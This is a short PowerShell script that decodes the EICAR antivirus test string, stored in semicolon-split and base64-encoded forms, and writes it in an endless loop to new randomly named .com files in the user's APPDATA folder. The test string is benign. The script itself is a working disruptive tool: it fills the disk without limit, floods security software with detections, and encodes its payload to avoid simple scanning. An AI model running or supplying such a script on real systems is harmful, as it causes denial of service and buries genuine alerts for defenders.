$raw = 'X;5;O;!;P;%;@;A;P;[;4;\;P;Z;X;5;4;(;P;^;);7;C;C;);7;};$;E;I;C;A;R;-;S;T;A;N;D;A;R;D;-;A;N;T;I;V;I;R;U;S;-;T;E;S;T;-;F;I;L;E;!;$;H;+;H;*;' #";" delimit
$base64 = 'WAA1AE8AIQBQACUAQABBAFAAWwA0AFwAUABaAFgANQA0ACgAUABeACkANwBDAEMAKQA3AH0AJABFAEkAQwBBAFIALQBTAFQAQQBOAEQAQQBSAEQALQBBAE4AVABJAFYASQBSAFUAUwAtAFQARQBTAFQALQBGAEkATABFACEAJABIACsASAAqAA=='
$code = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64));
while($true){
$rand = Get-Random
New-Item "$env:APPDATA\$rand.com" -Type File -Force | Out-Null
Set-Content "$env:APPDATA\$rand.com" -Value $code -Force | Out-Null
}